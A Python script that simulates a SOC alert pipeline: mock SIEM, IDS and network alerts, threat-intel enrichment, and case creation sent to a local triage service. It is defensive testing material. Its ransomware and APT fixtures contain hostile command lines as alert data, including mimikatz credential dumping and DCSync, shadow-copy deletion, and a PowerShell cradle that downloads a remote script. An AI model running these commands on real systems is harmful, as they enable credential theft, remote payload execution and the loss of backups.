"""
NexusSOC — Full SOC Stack Simulation
=====================================
Complete alert pipeline as it runs in production:

  [Alert Sources]         [Shuffle SOAR]                  [Outputs]
  ────────────────        ──────────────────────────────  ─────────
  Wazuh SIEM/EDR  ──┐    1. Receive raw alert (webhook)
  Suricata IDS    ──┤    2. Parse + extract IOCs
  Arkime/Zeek     ──┘    3. MISP        → threat intel
                         4. Cortex/VT   → malware score
                         5. Cortex/AIDB → IP reputation
                         6. OpenCTI     → actor + TTPs
                         7. TheHive     → create case
                         8. NexusSOC    → /analyze-case

Usage:
    python shuffle_simulation.py
    python shuffle_simulation.py --scenario ransomware apt
    python shuffle_simulation.py --scenario dns insider web
"""

import httpx
import json
import asyncio
import random
import uuid
from datetime import datetime, timezone, timedelta
from typing import Optional, List, Dict, Any

# ── SERVICE ENDPOINTS ─────────────────────────────────────────────────────────
NEXUSSOC_URL = "http://localhost:8001/analyze-case"
RESULTS_FILE = "sim_results.json"

SHUFFLE_WORKFLOW_ID  = "wf_nexussoc_triage_v3"
SHUFFLE_EXECUTION_ID = f"exec_{uuid.uuid4().hex[:12]}"


def ts(hours_ago: float = 0) -> str:
    t = datetime.now(timezone.utc) - timedelta(hours=hours_ago)
    return t.isoformat().replace("+00:00", "Z")


def gen_id(prefix: str = "CASE") -> str:
    return f"{prefix}-{uuid.uuid4().hex[:8].upper()}"


# ── RAW ALERT FORMATS ─────────────────────────────────────────────────────────
# Native formats each tool sends to Shuffle via webhook / Kafka / syslog.

def wazuh_alert(rule_id: str, level: int, description: str, agent_name: str,
                agent_ip: str, mitre_ids: List[str], mitre_tactics: List[str],
                event_data: Dict, hours_ago: float = 0) -> Dict:
    """Wazuh alert in wazuh-alerts-4.x-YYYY.MM.DD index (OpenSearch) format."""
    return {
        "@timestamp": ts(hours_ago),
        "rule": {
            "id": rule_id,
            "level": level,
            "description": description,
            "groups": ["windows", "sysmon"],
            "mitre": {"id": mitre_ids, "tactic": mitre_tactics, "technique": mitre_ids},
        },
        "agent": {"id": "001", "name": agent_name, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "location": "EventChannel",
        "data": {"win": {"eventdata": event_data}},
        "_source_tool": "wazuh",
    }


def suricata_alert(sig_id: int, signature: str, category: str, severity: int,
                   src_ip: str, src_port: int, dest_ip: str, dest_port: int,
                   proto: str = "TCP", hours_ago: float = 0) -> Dict:
    """Suricata alert in EVE JSON format (sent to Shuffle via Kafka/Logstash)."""
    return {
        "timestamp": ts(hours_ago),
        "flow_id": uuid.uuid4().int & 0xFFFFFFFFFFFF,
        "event_type": "alert",
        "src_ip": src_ip,
        "src_port": src_port,
        "dest_ip": dest_ip,
        "dest_port": dest_port,
        "proto": proto,
        "alert": {
            "action": "allowed",
            "gid": 1,
            "signature_id": sig_id,
            "rev": 1,
            "signature": signature,
            "category": category,
            "severity": severity,
        },
        "_source_tool": "suricata",
    }


def arkime_session(src_ip: str, src_port: int, dst_ip: str, dst_port: int,
                   protocol: str, bytes_total: int, tags: List[str],
                   hours_ago: float = 0) -> Dict:
    """Arkime session record (REST API / webhook export format)."""
    return {
        "id": f"{datetime.now(timezone.utc).strftime('%y%m%d')}-{uuid.uuid4().hex[:12]}",
        "firstPacket": int((datetime.now(timezone.utc) - timedelta(hours=hours_ago)).timestamp() * 1000),
        "lastPacket":  int((datetime.now(timezone.utc) - timedelta(hours=hours_ago - 0.5)).timestamp() * 1000),
        "srcIp": src_ip,
        "srcPort": src_port,
        "dstIp": dst_ip,
        "dstPort": dst_port,
        "protocol": protocol,
        "totBytes": bytes_total,
        "totPackets": bytes_total // 1500,
        "node": "arkime-node-01",
        "tags": tags,
        "_source_tool": "arkime",
    }


def zeek_notice(note: str, msg: str, src_ip: str, dst_ip: str,
                hours_ago: float = 0) -> Dict:
    """Zeek notice.log record in JSON (zeek-kafka or json-streaming output)."""
    return {
        "ts": (datetime.now(timezone.utc) - timedelta(hours=hours_ago)).timestamp(),
        "uid": f"C{uuid.uuid4().hex[:16]}",
        "id.orig_h": src_ip,
        "id.orig_p": 54321,
        "id.resp_h": dst_ip,
        "id.resp_p": 53,
        "proto": "udp",
        "note": note,
        "msg": msg,
        "src": src_ip,
        "dst": dst_ip,
        "actions": ["Notice::ACTION_LOG"],
        "_source_tool": "zeek",
    }


# ── MOCK ENRICHMENT SERVICES ──────────────────────────────────────────────────
# Shuffle calls these REST APIs in parallel branches of the workflow.
# Response structures mirror the actual API contracts.

def mock_misp_lookup(ioc_meta: Dict) -> Dict:
    """MISP /events/restSearch — returns matching threat events for submitted IOCs."""
    actor    = ioc_meta.get("threat_actor", "Unknown")
    campaign = ioc_meta.get("campaign_name", "Unknown Campaign")
    mitre    = ioc_meta.get("mitre_ids", ["T1566"])

    attributes = []
    for ip in ioc_meta.get("ips", []):
        attributes.append({"type": "ip-dst", "value": ip, "to_ids": True, "category": "Network activity"})
    for h in ioc_meta.get("hashes", []):
        attributes.append({"type": "sha256", "value": h, "to_ids": True, "category": "Payload delivery"})
    for d in ioc_meta.get("domains", []):
        attributes.append({"type": "domain", "value": d, "to_ids": True, "category": "Network activity"})

    if not attributes:
        return {"response": []}

    return {
        "response": [{
            "Event": {
                "id": str(uuid.uuid4().int)[:6],
                "uuid": str(uuid.uuid4()),
                "info": campaign,
                "threat_level_id": "1" if ioc_meta.get("high_risk") else "2",
                "Attribute": attributes,
                "Tag": [
                    {"name": "tlp:amber"},
                    {"name": f"misp-galaxy:threat-actor=\"{actor}\""},
                    {"name": f"misp-galaxy:mitre-attack-pattern=\"{mitre[0]}\""},
                ],
                "Galaxy": [{
                    "name": "Threat Actor",
                    "GalaxyCluster": [{"value": actor, "description": f"APT group {actor}"}],
                }],
                "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
                "orgc": {"name": "CIRCL"},
            }
        }]
    }


def mock_cortex_virustotal(ioc_value: str, ioc_type: str,
                            vt_malicious: int, vt_total: int,
                            threat_names: List[str]) -> Dict:
    """Cortex VirusTotal_GetReport_3_1 analyzer response."""
    undetected = max(0, vt_total - vt_malicious - 2)
    return {
        "success": True,
        "analyzer": "VirusTotal_GetReport_3_1",
        "report": {
            "full": {
                "data": {
                    "id": ioc_value,
                    "type": ioc_type,
                    "attributes": {
                        "last_analysis_stats": {
                            "malicious": vt_malicious,
                            "suspicious": 2,
                            "undetected": undetected,
                            "harmless": 0,
                        },
                        "popular_threat_classification": {
                            "popular_threat_name": [{"value": n, "count": 10} for n in threat_names],
                        },
                        "reputation": -75 if vt_malicious > 20 else -5,
                    },
                }
            },
            "taxonomies": [
                {"level": "malicious" if vt_malicious > 5 else "info",
                 "namespace": "VT", "predicate": "Score",
                 "value": f"{vt_malicious}/{vt_total}"}
            ],
        },
    }


def mock_cortex_abuseipdb(ip: str, score: int, total_reports: int,
                           is_tor: bool = False, country: str = "RU") -> Dict:
    """Cortex AbuseIPDB_1_0 analyzer response."""
    return {
        "success": True,
        "analyzer": "AbuseIPDB_1_0",
        "report": {
            "full": {
                "data": {
                    "ipAddress": ip,
                    "abuseConfidenceScore": score,
                    "totalReports": total_reports,
                    "numDistinctUsers": max(1, total_reports // 3),
                    "isWhitelisted": False,
                    "isTor": is_tor,
                    "countryCode": country,
                    "usageType": "Data Center/Web Hosting/Transit",
                    "lastReportedAt": ts(24),
                }
            },
            "taxonomies": [
                {"level": "malicious" if score > 50 else "info",
                 "namespace": "AbuseIPDB", "predicate": "Score", "value": str(score)}
            ],
        },
    }


def mock_opencti_lookup(ioc_meta: Dict) -> Dict:
    """OpenCTI GraphQL — indicator + threat actor + malware lookup."""
    actor   = ioc_meta.get("threat_actor", "Unknown")
    mitre   = ioc_meta.get("mitre_ids", [])
    malware = ioc_meta.get("malware_families", [])
    ips     = ioc_meta.get("ips", [])
    obs_val = ips[0] if ips else ioc_meta.get("domains", ["unknown"])[0] if ioc_meta.get("domains") else "unknown"
    return {
        "data": {
            "stixCyberObservables": {
                "edges": [{"node": {
                    "standard_id": f"indicator--{uuid.uuid4()}",
                    "observable_value": obs_val,
                    "reports": {"edges": [{"node": {"name": ioc_meta.get("campaign_name", "")}}]},
                }}]
            },
            "threatActors": {
                "edges": [{"node": {"name": actor, "sophistication": "advanced"}}]
                if actor != "Unknown" else []
            },
            "malwares": {"edges": [{"node": {"name": m}} for m in malware]},
            "attackPatterns": {"edges": [{"node": {"x_mitre_id": m}} for m in mitre]},
        }
    }


def mock_thehive_create_case(title: str, severity: int,
                              tags: List[str], observables: List[Dict]) -> Dict:
    """TheHive POST /api/case response (TheHive 5 format)."""
    case_num = random.randint(100, 999)
    return {
        "id": f"~{uuid.uuid4().int & 0xFFFF}",
        "caseId": case_num,
        "title": title,
        "severity": severity,
        "status": "Open",
        "stage": "Incident",
        "assignee": "soc-analyst",
        "tags": tags,
        "observables": observables,
        "createdAt": ts(),
        "createdBy": "shuffle-soar",
    }


# ── IOC EXTRACTION ─────────────────────────────────────────────────────────────

def extract_iocs(raw_alert: Dict) -> Dict:
    """Shuffle action: parse raw alert and extract observable IOCs."""
    iocs: Dict[str, list] = {"ips": [], "hashes": [], "domains": []}
    tool = raw_alert.get("_source_tool", "")

    def is_external(ip: str) -> bool:
        return ip and not any(ip.startswith(p) for p in ("10.", "192.168.", "172."))

    if tool == "suricata":
        for key in ("src_ip", "dest_ip"):
            ip = raw_alert.get(key, "")
            if is_external(ip):
                iocs["ips"].append(ip)

    elif tool == "wazuh":
        ed = raw_alert.get("data", {}).get("win", {}).get("eventdata", {})
        for field in ("destinationIp", "sourceAddress", "sourceIp"):
            ip = ed.get(field, "")
            if is_external(ip):
                iocs["ips"].append(ip)
        for field in ("sha256", "hash"):
            h = ed.get(field, "")
            if h:
                iocs["hashes"].append(h)

    elif tool in ("arkime", "zeek"):
        for key in ("dstIp", "id.resp_h"):
            ip = raw_alert.get(key, "")
            if is_external(ip):
                iocs["ips"].append(ip)

    # deduplicate
    for k in iocs:
        iocs[k] = list(dict.fromkeys(iocs[k]))
    return iocs


# ── NEXUSSOC PAYLOAD ASSEMBLER ────────────────────────────────────────────────

SOURCE_MAP = {
    "wazuh":    "SIEM",
    "suricata": "Suricata IDS",
    "arkime":   "NetFlow Analysis",
    "zeek":     "NetFlow Analysis",
}

def assemble_payload(source_tool: str, raw_alert: Dict, enrichment: Dict) -> Dict:
    """
    Shuffle final action: merge raw alert + all enrichment into the
    SecurityAlert schema expected by NexusSOC /analyze-case.
    """
    meta    = enrichment.get("_meta", {})
    misp    = enrichment.get("misp", {})
    vt      = enrichment.get("virustotal", {})
    abuse   = enrichment.get("abuseipdb", {})
    opencti = enrichment.get("opencti", {})
    hive    = enrichment.get("thehive", {})

    # VirusTotal
    vt_attrs = (vt.get("report", {}).get("full", {})
                  .get("data", {}).get("attributes", {}))
    vt_stats = vt_attrs.get("last_analysis_stats", {})
    vt_names = [n["value"] for n in
                vt_attrs.get("popular_threat_classification", {})
                        .get("popular_threat_name", [])]

    # AbuseIPDB
    abuse_data = abuse.get("report", {}).get("full", {}).get("data", {})

    # MISP threat actor
    misp_events = misp.get("response", [])
    misp_actor, misp_tags = "", []
    if misp_events:
        ev = misp_events[0].get("Event", {})
        misp_tags = [t["name"] for t in ev.get("Tag", [])]
        for g in ev.get("Galaxy", []):
            if g.get("name") == "Threat Actor":
                clusters = g.get("GalaxyCluster", [])
                if clusters:
                    misp_actor = clusters[0].get("value", "")

    # OpenCTI actor fallback
    oc_actors = opencti.get("data", {}).get("threatActors", {}).get("edges", [])
    oc_actor  = oc_actors[0]["node"]["name"] if oc_actors else ""

    payload: Dict[str, Any] = {
        "sourceRef":       meta.get("source_ref", gen_id()),
        "title":           meta.get("title", "Unknown Alert"),
        "description":     meta.get("description", ""),
        "source":          SOURCE_MAP.get(source_tool, "SIEM"),
        "severity":        meta.get("severity", "medium"),
        "timestamp":       (raw_alert.get("@timestamp")
                            or raw_alert.get("timestamp")
                            or ts()),
        "attack_type":     meta.get("attack_type", "unknown"),
        "hostname":        meta.get("hostname", ""),
        "user":            meta.get("user", ""),
        "mitre_techniques": meta.get("mitre_techniques", []),
        "kill_chain_phase": meta.get("kill_chain_phase", ""),
        "indicators":      meta.get("indicators", []),
        "network":         meta.get("network") or None,
        # VT enrichment (only include when data exists)
        "vt_malicious":    vt_stats.get("malicious") if vt_stats else None,
        "vt_total":        sum(vt_stats.values()) if vt_stats else None,
        "vt_names":        vt_names or None,
        # AbuseIPDB enrichment (only include when data exists)
        "ip_abuse_score":  abuse_data.get("abuseConfidenceScore") or None,
        "ip_total_reports": abuse_data.get("totalReports") or None,
        "ip_is_tor":       abuse_data.get("isTor") or None,
        # TheHive case reference
        "thehive_id":      hive.get("id"),
    }

    for opt in ("file_analysis", "data_exfil", "priv_esc", "correlated_cases"):
        if opt in meta:
            payload[opt] = meta[opt]

    return payload


# ── SHUFFLE WORKFLOW ──────────────────────────────────────────────────────────

async def shuffle_workflow(raw_alert: Dict, meta: Dict,
                           ec: Dict, client: httpx.AsyncClient) -> Dict:
    """
    Emulates a Shuffle workflow execution:
    trigger → IOC extraction → parallel enrichment → TheHive case → NexusSOC.
    """
    source_tool = raw_alert.get("_source_tool", "unknown")
    iocs = extract_iocs(raw_alert)
    ioc_meta = {**iocs, **ec.get("ioc_meta", {})}

    print(f"  [Shuffle] IOCs → IPs:{iocs['ips']} hashes:{iocs['hashes'][:1]}")

    # Parallel enrichment branches
    misp_r  = mock_misp_lookup(ioc_meta)
    vt_r    = mock_cortex_virustotal(
                  ec.get("vt_ioc", (iocs["ips"] or [""])[0]),
                  ec.get("vt_type", "ip_address"),
                  ec.get("vt_malicious", 0), ec.get("vt_total", 72),
                  ec.get("threat_names", []))
    abuse_r = mock_cortex_abuseipdb(
                  (iocs["ips"] or [""])[0],
                  ec.get("abuse_score", 0), ec.get("abuse_reports", 0),
                  ec.get("is_tor", False))
    octi_r  = mock_opencti_lookup(ioc_meta)

    print(f"  [MISP]     {len(misp_r.get('response', []))} event(s)")
    print(f"  [VT]       {ec.get('vt_malicious', 0)}/{ec.get('vt_total', 72)} detections  names={ec.get('threat_names', [])[:2]}")
    print(f"  [AbuseIPDB] score={ec.get('abuse_score', 0)}  reports={ec.get('abuse_reports', 0)}  tor={ec.get('is_tor', False)}")
    print(f"  [OpenCTI]  actor={ioc_meta.get('threat_actor', 'Unknown')}  malware={ioc_meta.get('malware_families', [])[:2]}")

    # TheHive case
    observables  = [{"dataType": "ip",   "data": ip} for ip in iocs["ips"]]
    observables += [{"dataType": "hash", "data": h}  for h  in iocs["hashes"]]
    hive_case = mock_thehive_create_case(
        title=f"[NexusSOC] {meta.get('title', 'Alert')}",
        severity=3 if meta.get("severity") == "critical" else 2,
        tags=[meta.get("attack_type", "unknown"), source_tool, "shuffle-auto"],
        observables=observables,
    )
    print(f"  [TheHive]  Case #{hive_case['caseId']} created ({hive_case['id']})")

    payload = assemble_payload(source_tool, raw_alert, {
        "misp": misp_r, "virustotal": vt_r,
        "abuseipdb": abuse_r, "opencti": octi_r,
        "thehive": hive_case, "_meta": meta,
    })

    try:
        resp = await client.post(NEXUSSOC_URL, json=payload, timeout=30.0)
        resp.raise_for_status()
        result     = resp.json()
        decision   = result.get("result", {}).get("decision", "N/A")
        confidence = result.get("result", {}).get("confidence", 0)
        print(f"  [NexusSOC] {decision}  confidence={confidence:.2f}")
        return {"status": "success", "case_id": payload["sourceRef"], "response": result}
    except httpx.HTTPStatusError as e:
        try:
            detail = e.response.json()
        except Exception:
            detail = e.response.text
        print(f"  [NexusSOC] HTTP {e.response.status_code}: {json.dumps(detail)[:400]}")
        return {"status": "error", "case_id": payload["sourceRef"], "error": str(detail)}
    except httpx.ConnectError:
        print(f"  [NexusSOC] Connection refused — NexusSOC not running on {NEXUSSOC_URL}")
        return {"status": "error", "case_id": payload["sourceRef"], "error": "connection_refused"}
    except httpx.HTTPError as e:
        print(f"  [NexusSOC] {type(e).__name__}: {e}")
        return {"status": "error", "case_id": payload["sourceRef"], "error": str(e)}


# ── SCENARIOS ─────────────────────────────────────────────────────────────────
# Each returns: List of (raw_alert, meta, enrichment_config)

def scenario_ransomware() -> List[tuple]:
    """Ryuk ransomware: Wazuh phishing → Suricata C2 → Wazuh Mimikatz → Wazuh FIM encryption."""
    campaign = f"RYUK-{uuid.uuid4().hex[:6].upper()}"
    cases: List[tuple] = []

    # 1 — Wazuh: malicious email attachment
    ref1 = gen_id()
    cases.append((
        wazuh_alert("87701", 12, "Malicious Email Attachment — QakBot Loader",
                    "EXCH-01", "10.0.1.50",
                    ["T1566.001", "T1204.002"], ["Initial Access", "Execution"],
                    {"fileName": "Invoice_2024_Q4.pdf.scr",
                     "sha256": "e4d9f2a1b3c5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1",
                     "sourceAddress": "185.234.72.19",
                     "destinationUser": "finance@corp.local",
                     "yaraRule": "QakBot_Loader_v4"}, hours_ago=4),
        {"source_ref": ref1,
         "title": f"Wazuh: QakBot Malicious Attachment [{campaign}]",
         "description": (f"Malicious .scr attachment on EXCH-01. "
                         f"Sender: accounts@invo1ce-systems.info (spoofed). "
                         f"YARA: QakBot_Loader_v4. Campaign: {campaign}."),
         "severity": "high", "attack_type": "malware",
         "hostname": "EXCH-01", "user": "finance@corp.local",
         "mitre_techniques": ["T1566.001", "T1204.002"],
         "kill_chain_phase": "delivery",
         "indicators": ["malicious_attachment", "typosquatting_domain", "qakbot"],
         "network": {"source_ip": "185.234.72.19", "destination_ip": "10.0.1.50", "protocol": "SMTP", "port": 25},
         "file_analysis": {"file_name": "Invoice_2024_Q4.pdf.scr",
                           "file_hash_sha256": "e4d9f2a1b3c5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1",
                           "yara_rule": "QakBot_Loader_v4",
                           "av_detections": ["ESET", "Kaspersky", "Bitdefender"]}},
        {"vt_ioc": "e4d9f2a1b3c5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1",
         "vt_type": "file", "vt_malicious": 48, "vt_total": 68,
         "threat_names": ["QakBot", "Qbot", "Pinkslipbot"],
         "abuse_score": 94, "abuse_reports": 847,
         "ioc_meta": {"high_risk": True, "threat_actor": "TA577",
                      "campaign_name": campaign, "mitre_ids": ["T1566.001"],
                      "malware_families": ["QakBot"],
                      "ips": ["185.234.72.19"],
                      "hashes": ["e4d9f2a1b3c5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1"]}},
    ))

    # 2 — Suricata: QakBot C2 beacon
    ref2 = gen_id()
    cases.append((
        suricata_alert(2030171, "ET MALWARE Win32/QakBot C2 Beacon",
                       "A Network Trojan was detected", 1,
                       "10.0.10.42", 51234, "185.234.72.19", 443, hours_ago=3.5),
        {"source_ref": ref2,
         "title": f"Suricata: QakBot C2 Beacon [{campaign}]",
         "description": (f"Outbound C2 beacon 10.0.10.42 → 185.234.72.19:443. "
                         f"Encrypted jittered 60s interval. ET sig 2030171. Campaign: {campaign}."),
         "severity": "critical", "attack_type": "malware",
         "hostname": "WS-FIN-012", "user": "finance@corp.local",
         "mitre_techniques": ["T1071.001", "T1573.001"],
         "kill_chain_phase": "install",
         "indicators": ["c2_beacon", "encrypted_channel", "known_malware_ip"],
         "network": {"source_ip": "10.0.10.42", "destination_ip": "185.234.72.19", "protocol": "HTTPS", "port": 443},
         "correlated_cases": [ref1]},
        {"vt_ioc": "185.234.72.19", "vt_type": "ip_address",
         "vt_malicious": 52, "vt_total": 68, "threat_names": ["QakBot", "Qbot"],
         "abuse_score": 94, "abuse_reports": 847,
         "ioc_meta": {"high_risk": True, "threat_actor": "TA577",
                      "campaign_name": campaign, "mitre_ids": ["T1071.001"],
                      "ips": ["185.234.72.19"]}},
    ))

    # 3 — Wazuh: Mimikatz credential dump
    ref3 = gen_id()
    cases.append((
        wazuh_alert("87102", 15, "Mimikatz Credential Dumping Detected",
                    "WS-FIN-012", "10.0.10.42",
                    ["T1003.001", "T1003.003"], ["Credential Access"],
                    {"commandLine": "mimikatz.exe sekurlsa::logonpasswords lsadump::dcsync",
                     "parentImage": "explorer.exe",
                     "user": "CORP\\finance",
                     "currentDirectory": "C:\\Users\\Public\\Downloads\\"}, hours_ago=2.5),
        {"source_ref": ref3,
         "title": f"Wazuh: Mimikatz Credential Dump [{campaign}]",
         "description": (f"Mimikatz on WS-FIN-012 from Public\\Downloads. "
                         f"Commands: sekurlsa::logonpasswords + lsadump::dcsync. "
                         f"Parent: explorer.exe (no user interaction). Campaign: {campaign}."),
         "severity": "critical", "attack_type": "privilege_escalation",
         "hostname": "WS-FIN-012", "user": "CORP\\finance",
         "mitre_techniques": ["T1003.001", "T1003.003"],
         "kill_chain_phase": "install",
         "indicators": ["mimikatz_execution", "credential_dump", "lsass_access"],
         "correlated_cases": [ref1, ref2],
         "priv_esc": {"privilege_level_before": "user",
                      "privilege_level_after": "local_system",
                      "process_chain": ["explorer.exe", "cmd.exe", "mimikatz.exe"]}},
        {"vt_malicious": 0, "vt_total": 0, "abuse_score": 0, "abuse_reports": 0,
         "ioc_meta": {"mitre_ids": ["T1003.001"], "malware_families": ["Mimikatz"]}},
    ))

    # 4 — Wazuh FIM: Ryuk mass encryption
    cases.append((
        wazuh_alert("550", 15, "Ryuk Ransomware File Encryption Detected",
                    "FS-01", "10.0.20.5",
                    ["T1486", "T1490"], ["Impact"],
                    {"fileName": "ryuk.exe",
                     "sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                     "commandLine": "vssadmin.exe delete shadows /all /quiet",
                     "modifiedFiles": "152847",
                     "fileExtension": ".ryk"}, hours_ago=0.5),
        {"source_ref": gen_id(),
         "title": f"Wazuh FIM: Ryuk Encryption — 152k files [{campaign}]",
         "description": (f"152,847 files encrypted (.ryk) on FS-01. "
                         f"Shadow copies deleted. Ransom note: README_RECOVERY.txt. "
                         f"YARA: Ryuk_Ransomware_2024. Active encryption. Campaign: {campaign}."),
         "severity": "critical", "attack_type": "malware",
         "hostname": "FS-01", "user": "NT AUTHORITY\\SYSTEM",
         "mitre_techniques": ["T1486", "T1490", "T1070.003"],
         "kill_chain_phase": "actions_on_objectives",
         "indicators": ["ransomware_encryption", "shadow_copy_deletion", "ransom_note"],
         "correlated_cases": [ref1, ref2, ref3],
         "file_analysis": {"file_name": "ryuk.exe",
                           "file_hash_sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                           "yara_rule": "Ryuk_Ransomware_2024",
                           "av_detections": ["CrowdStrike", "SentinelOne", "Microsoft Defender"],
                           "process_behavior": ["mass encryption .ryk",
                                                "vssadmin delete shadows /all /quiet"]}},
        {"vt_ioc": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
         "vt_type": "file", "vt_malicious": 65, "vt_total": 70,
         "threat_names": ["Ryuk", "Conti", "Hermes"],
         "abuse_score": 0, "abuse_reports": 0,
         "ioc_meta": {"high_risk": True, "threat_actor": "WIZARD SPIDER",
                      "campaign_name": campaign, "mitre_ids": ["T1486"],
                      "malware_families": ["Ryuk", "QakBot"],
                      "hashes": ["a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"]}},
    ))
    return cases


def scenario_apt() -> List[tuple]:
    """APT29: Suricata recon → Wazuh Cobalt Strike PowerShell → Zeek DNS tunnel → Wazuh DCSync."""
    campaign = f"APT29-{uuid.uuid4().hex[:6].upper()}"
    cases: List[tuple] = []

    # 1 — Suricata: slow port scan from APT29 IP
    ref1 = gen_id()
    cases.append((
        suricata_alert(2010936, "ET SCAN Potential SSH Scan — known APT29 source",
                       "Attempted Information Leak", 2,
                       "91.231.174.92", random.randint(40000, 60000),
                       "10.0.1.10", 443, hours_ago=72),
        {"source_ref": ref1,
         "title": f"Suricata: APT29 Slow Port Scan [{campaign}]",
         "description": (f"Slow TCP scan (1 port/30s) from 91.231.174.92 — known APT29 infrastructure. "
                         f"Targets: mail.corp.local, vpn.corp.local. "
                         f"Russian business hours. Evasion pattern. Campaign: {campaign}."),
         "severity": "medium", "attack_type": "reconnaissance",
         "hostname": "mail.corp.local",
         "mitre_techniques": ["T1595.001", "T1046"],
         "kill_chain_phase": "reconnaissance",
         "indicators": ["port_scan", "known_apt_infrastructure", "slow_scan_evasion"],
         "network": {"source_ip": "91.231.174.92", "destination_ip": "10.0.1.10", "protocol": "TCP", "port": 443}},
        {"vt_ioc": "91.231.174.92", "vt_type": "ip_address",
         "vt_malicious": 38, "vt_total": 62, "threat_names": ["APT29", "CozyBear"],
         "abuse_score": 89, "abuse_reports": 423,
         "ioc_meta": {"high_risk": True, "threat_actor": "APT29",
                      "campaign_name": campaign, "mitre_ids": ["T1595.001"],
                      "ips": ["91.231.174.92"]}},
    ))

    # 2 — Wazuh: encoded PowerShell → Cobalt Strike
    ref2 = gen_id()
    cases.append((
        wazuh_alert("92200", 15, "Obfuscated PowerShell Download Cradle — Cobalt Strike",
                    "WS-HR-003", "10.0.10.55",
                    ["T1059.001", "T1027.010", "T1562.001"], ["Execution", "Defense Evasion"],
                    {"commandLine": ("powershell.exe -EncodedCommand -WindowStyle Hidden "
                                    "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA..."),
                     "decodedCommand": "IEX(New-Object Net.WebClient).DownloadString('http://update-service.ru/stage2.ps1')",
                     "parentImage": "winword.exe",
                     "user": "CORP\\hr.director",
                     "sha256": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"},
                    hours_ago=36),
        {"source_ref": ref2,
         "title": f"Wazuh: Cobalt Strike via Encoded PowerShell [{campaign}]",
         "description": (f"PowerShell -EncodedCommand on WS-HR-003. "
                         f"Decoded: IEX DownloadString from update-service.ru/stage2.ps1. "
                         f"AMSI bypass + script block logging disabled. Parent: winword.exe. Campaign: {campaign}."),
         "severity": "critical", "attack_type": "malware",
         "hostname": "WS-HR-003", "user": "CORP\\hr.director",
         "mitre_techniques": ["T1059.001", "T1027.010", "T1562.001", "T1105"],
         "kill_chain_phase": "install",
         "indicators": ["powershell_encoded", "amsi_bypass", "cobalt_strike", "lolbin"],
         "correlated_cases": [ref1],
         "file_analysis": {"file_name": "stage2.ps1",
                           "file_hash_sha256": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
                           "yara_rule": "CobaltStrike_Beacon_Stage2"}},
        {"vt_ioc": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
         "vt_type": "file", "vt_malicious": 55, "vt_total": 68,
         "threat_names": ["CobaltStrike", "Beacon"],
         "abuse_score": 0, "abuse_reports": 0,
         "ioc_meta": {"high_risk": True, "threat_actor": "APT29",
                      "campaign_name": campaign, "mitre_ids": ["T1059.001"],
                      "malware_families": ["CobaltStrike"],
                      "domains": ["update-service.ru"],
                      "hashes": ["c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"]}},
    ))

    # 3 — Zeek: DNS tunneling exfil
    ref3 = gen_id()
    cases.append((
        zeek_notice("DNS::Tunneling",
                    "DNS tunneling: 2400 TXT queries/h to update-cdn.ru (baseline 50/h). Base64 subdomains.",
                    "10.0.10.55", "185.141.25.68", hours_ago=24),
        {"source_ref": ref3,
         "title": f"Zeek: APT29 DNS Tunneling (SeaDuke pattern) [{campaign}]",
         "description": (f"2,400 DNS TXT queries/h from WS-HR-003 → update-cdn.ru "
                         f"(baseline 50/h). Base64-encoded subdomains. ~15MB/h exfil. "
                         f"Matches APT29 SeaDuke C2 pattern. Campaign: {campaign}."),
         "severity": "high", "attack_type": "data_exfiltration",
         "hostname": "WS-HR-003", "user": "CORP\\hr.director",
         "mitre_techniques": ["T1048.003", "T1071.004"],
         "kill_chain_phase": "exfiltration",
         "indicators": ["dns_tunneling", "txt_record_abuse", "base64_subdomain"],
         "network": {"source_ip": "10.0.10.55", "destination_ip": "185.141.25.68", "protocol": "DNS", "port": 53},
         "correlated_cases": [ref1, ref2],
         "data_exfil": {"data_volume_gb": 0.36, "transfer_type": "dns_tunnel",
                        "data_types": ["employee_pii", "salary_data"], "encryption": "base64"}},
        {"vt_ioc": "185.141.25.68", "vt_type": "ip_address",
         "vt_malicious": 41, "vt_total": 62, "threat_names": ["APT29", "SeaDuke"],
         "abuse_score": 91, "abuse_reports": 312,
         "ioc_meta": {"high_risk": True, "threat_actor": "APT29",
                      "campaign_name": campaign, "mitre_ids": ["T1048.003"],
                      "ips": ["185.141.25.68"], "domains": ["update-cdn.ru"]}},
    ))

    # 4 — Wazuh: DCSync — domain fully compromised
    cases.append((
        wazuh_alert("87105", 15, "DCSync Attack — KRBTGT Hash Extraction",
                    "WS-HR-003", "10.0.10.55",
                    ["T1003.003", "T1558.003"], ["Credential Access"],
                    {"commandLine": "mimikatz.exe lsadump::dcsync /domain:corp.local /user:krbtgt",
                     "user": "CORP\\hr.director",
                     "targetDc": "DC-01"}, hours_ago=12),
        {"source_ref": gen_id(),
         "title": f"Wazuh: DCSync — KRBTGT extracted, Golden Ticket possible [{campaign}]",
         "description": (f"DCSync from WS-HR-003 against DC-01. "
                         f"KRBTGT hash extracted — Golden Ticket attack possible. "
                         f"User: CORP\\hr.director (compromised). Domain fully compromised. Campaign: {campaign}."),
